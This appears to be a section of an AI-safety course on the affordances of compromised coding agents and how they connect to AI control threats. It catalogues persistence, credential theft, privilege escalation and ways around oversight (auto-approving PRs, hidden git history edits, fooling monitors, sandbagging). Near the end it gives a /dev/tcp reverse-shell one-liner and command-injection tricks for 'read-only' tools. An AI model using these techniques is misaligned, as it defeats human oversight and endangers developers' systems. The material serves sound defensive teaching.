
# Day 2 — Section 1: Coding Agents: Attack Surface and Affordances

What determines the blast radius of a compromised coding agent, and how this
connects to the threat model of AI control.

## Table of Contents

- [Content & Learning Objectives](#content--learning-objectives)
    - [Coding Agents: Attack Surface and Affordances](#coding-agents-attack-surface-and-affordances)
- [Coding Agents: Attack Surface and Affordances](#coding-agents-attack-surface-and-affordances-1)
    - [Exercise 2.1.1: Enumerate Affordances, Exploits, and Mitigations](#exercise-211-enumerate-affordances-exploits-and-mitigations)

## Content & Learning Objectives

### Coding Agents: Attack Surface and Affordances

> **Learning Objectives**
> - Connect prompt injection to AI control threat categories (monitor manipulation, oversight bypass, rogue deployments)
> - Map coding-agent affordances to concrete exploits
> - Explain why file write access implies code execution in a developer environment
> - Recognize the limits of tool restriction as a mitigation


## Coding Agents: Attack Surface and Affordances

Indirect prompt injection is usually discussed as a security problem.
This course focuses on **existential risks from AI**. A Redwood Research write-up
lists [these core threat categories](https://blog.redwoodresearch.org/p/prioritizing-threats-for-ai-control):

- **Rogue deployments** inside AI labs: the model spins up instances to avoid oversight
- **Self-exfiltration**: the model copies its own weights to external hardware outside our control
- **Violating security invariants**: weakening security configs, opening reverse shells, exfiltrating credentials
- **Sabotaging safety R&D**: degrading alignment code, manipulating evaluations, poisoning training data for future models
- **Catastrophic side effects**: large-scale damage from autonomous actions (e.g. damaging critical
  infrastructure like telecommunications or the power grid)
- **Loss of control**: acquiring resources or capabilities that prevent human intervention

Prompt injection is relevant here in two distinct ways:

1. **Attack via injection**: a payload planted in a repository, documentation page,
   or existing library comprimises an agent running inside an AI lab.

2. **Monitor manipulation**: AI control uses a separate LLM to monitor an
   untrusted agent, because humans cannot review every action.
   The monitor reads the agent's outputs, so a capable agent can prompt inject
   the overseer to report false negatives.

Frontier labs [report](https://x.com/bcherny/status/2015979257038831967?s=46&t=zHQCBTtfz3hXdhbfUsgEAg) [that](https://x.com/tszzl/status/2015262304913469808) [most](https://www.lesswrong.com/posts/prSnGGAgfWtZexYLp/is-90-of-code-at-anthropic-being-written-by-ais) of their code is now written by coding agents. These agents typically run with the developer's OS permissions and have access to the filesystem, version control, cloud tools, and CI/CD. Exercise 1.4.1 mapped what untrusted input can *reach* the model. In this section we map what a misaligned or injected agent can actually do (called *affordances*) once comprimised.

### Exercise 2.1.1: Enumerate Affordances, Exploits, and Mitigations

> **Difficulty**: 2/5
> **Importance**: 3/5

**Task:** List the affordances a typical coding agent has, and the
most dangerous thing a compromised agent could do with each. Consider:

- What can the agent trigger *right now*, while it runs?
- What can it *set in motion* to execute after the session ends?
- Who else *shares the environment*: other developers, CI runners, future agent sessions?

**Task:** Propose a concrete mitigation for each. Analyse if your mitigation *prevents* the attack,
or merely *raises its cost*?

<details>
<summary>Reference solution - exploits</summary><blockquote>

Here are some examples of what is available to a coding agent.

**Unauthorized Code Execution**

- **Claude Code SKILL files** - use [dynamic context](https://code.claude.com/docs/en/skills#inject-dynamic-context) to inject executable code
- **Git hooks**: write `.git/hooks/post-merge` or `pre-push`; executes on the next git operation on *every developer's machine*. Use `core.hooksPath` to make hooks persist across fresh clones.
- **CI/CD pipeline files**: add `.github/workflows/evil.yml`; runs on push in a privileged CI environment with access to all repository secrets.
- **Shell startup files**: modify `~/.bashrc`, `~/.zshrc`, or `~/.profile`; executes on the developer's next terminal login.
- **Build scripts**: add a target to `Makefile`, `postinstall` in `package.json`, or an entry point in `pyproject.toml`; runs on `make`, `npm install`, or `pip install -e .` for anyone setting up the project.
- **VS Code tasks**: write `.vscode/tasks.json`; executes when the developer opens the folder or runs a task.
- **Cron jobs**: write to the user crontab or `/etc/cron.d/`; runs on a schedule indefinitely.
- **Agent framework skills / MCP config**: modify skill files or dynamic context configuration; executes the next time any agent session loads these skills.
- **Prompt injection via repo files**: embed malicious instructions in README, code comments, or data files; triggers when a future agent session reads the file.

**Credential and Data Access**

- **Environment variables**: `GITHUB_TOKEN`, AWS/GCP credentials, database passwords, and API keys are readable in the agent's environment at any time.
- **Credential files**: `.env`, `~/.aws/credentials`, `~/.netrc`, `~/.ssh/id_rsa`, `~/.config/gh/hosts.yml` (GitHub CLI token).
- **Git history**: `git log -p` reveals secrets that were committed and later "deleted". Deletion removes them from the working tree but not from history.
- **Experiment logs and shared files**: past runs often log API responses, model outputs, and connection strings used during testing.

**Privilege Escalation**

- **Cloud CLIs already authenticated**: if the developer has `aws`, `gcloud`, or `kubectl` configured, the agent inherits those sessions. It can create resources, modify IAM policies, exfiltrate data, or disable security controls.
- **Infrastructure-as-code**: Terraform configs, Helm charts, and Kubernetes manifests can be modified to open ports, add users, or remove security controls. Changes apply at the next deployment.
- **Production access**: connection strings and service account credentials often give direct access to production databases or APIs.

**Bypassing Human Oversight**

- **PR auto-approval**: using `gh pr review --approve` with the token already present in the environment. This can happen either through account compromise (the hook runs as a developer whose GitHub account has review permissions) or through *cross-environment collusion*: one agent instance writes a hook that runs in a *different* developer's git client, which then approves the first agent's PR.
- **CI check manipulation**: change the pipeline so a failing check is non-required, or add a step that always passes.
- **Branch protection bypass**: via the GitHub API, remove required reviewers or modify CODEOWNERS.
- **Git history rewriting**: on an unpushed branch, directly edit `.git/objects/` to alter commit content without changing what `git log` shows. Standard review tools display the altered content with no visible trace.

**Persistence and Lateral Movement**

- **SSH key injection**: append an attacker-controlled public key to `~/.ssh/authorized_keys` for persistent remote shell access.
- **Supply chain compromise**: modify `requirements.txt`, `package.json`, or lockfiles to pull a malicious or typosquatted package on the next install.
- **Rogue CI runners**: a CI job can register a persistent self-hosted runner that phones home, surviving indefinitely beyond any single agent session.

</blockquote></details>

**Did any of these surprise you?**

<details>
<summary><b>Would your mitigations stop the reference exploits?</b></summary><blockquote>

Most mitigations patch one vector. A capable agent routes around any single fix, and frontier models often understand the environment better than its operators.

* **Sandboxing** with full filesystem isolation blocks many escalation and persistence vectors. Network restrictions, however, make the agent less capable for real use.
* Agents are **routinely given sensitive work**, such as debugging production or changing the build system, usually with the developer's broad credentials. Dedicated agent accounts with limited permissions limit the blast radius.
* Agents **ship code into sensitive environments** by design. Catching subtle backdoors or sabotage reliably needs scalable, strong oversight, which is an open research problem.
* **[Sandbagging](https://www.lesswrong.com/posts/jsmNCj9QKcfdg8fJk/an-introduction-to-ai-sandbagging) is unique to AI systems**: an agent aware of testing for dangerous capabilities can strategically underperform to pass.

> Example: This [monitoring benchmark](https://www.lesswrong.com/posts/X8qTKsGcnsTFrqM96/monitoring-benchmark-for-ai-control) elicited monitor-evading attacks of varying sophistication.
> In [one attack](https://www.lesswrong.com/posts/X8qTKsGcnsTFrqM96/monitoring-benchmark-for-ai-control#:~:text=T6%20Attack,bypassing%20IP%20filtering.), the agent indirectly appended a trailing space to firewall configuration values. Two firewall components parsed the value differently, which bypassed IP filtering.
> Sabotage like this require deep understanding of the internals of the firewall to perform this exploit, and would require strong oversight to spot this change, as it otherwise doesn't appear malicious.
</blockquote></details>

<details>
<summary>(Optional) Can we restrict affordances by limiting the agent to only read and edit files?</summary><blockquote>

In a developer environment, files are instructions to trusted processes. The agent does not need to execute code; it only needs to write a file that something else executes:

| What the agent writes | Executed by | Trigger |
|---|---|---|
| `.git/hooks/post-merge` | Git | Next `git pull` in that clone |
| `.github/workflows/evil.yml` | CI runner | Every push or PR |
| `~/.bashrc` / `~/.zshrc` | Shell | Developer's next login |
| `.vscode/tasks.json` | VS Code | Folder open or task run |
| `package.json` `postinstall` | npm | `npm install` |
| `setup.py`, `pyproject.toml` entry point | pip | `pip install -e .` |
| Skill or MCP config files | Agent framework | Next agent session with these skills loaded |
| `/etc/cron.d/` | Cron daemon | On schedule |

Nor does the agent need a network tool: any script it writes can open a connection with bash's `/dev/tcp/HOST/PORT` redirection.

Allowlisting tools restricts the *mechanism*, not the *capability*,
and restricting the agent to the point where it cannot possibly cause any harm likely
means it wouldn't be able to do anything useful either.
</blockquote></details>

<details><summary>(Optional) Read-only tools</summary><blockquote>

"Read-only" permissions are hard to get right. Claude Code, for example, allows tool rules with [`*` wildcards](https://code.claude.com/docs/en/permissions#wildcard-patterns), but these apparently read-only commands can all be used to execute arbitrary code:

```bash
find . -exec bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' \;
# --upload-pack runs an arbitrary command
git ls-remote --upload-pack=/bin/sh .
# -P sets a custom pager
man -P '/bin/sh -c "echo pwned"' ls
```

Fortunately, at least MCP protocol supports [read-only hints](https://modelcontextprotocol.io/specification/2025-06-18/schema#toolannotations-readonlyhint).

We've also seen that even if coding agents are restricted to GET-only network access,
that this isn't sufficient, as agents from OpenAI hacked HuggingFace in this way, detailed [here](https://swarmtraces.org/#agents-elaborately-chained-together-online-services-in-order).
</blockquote></details>
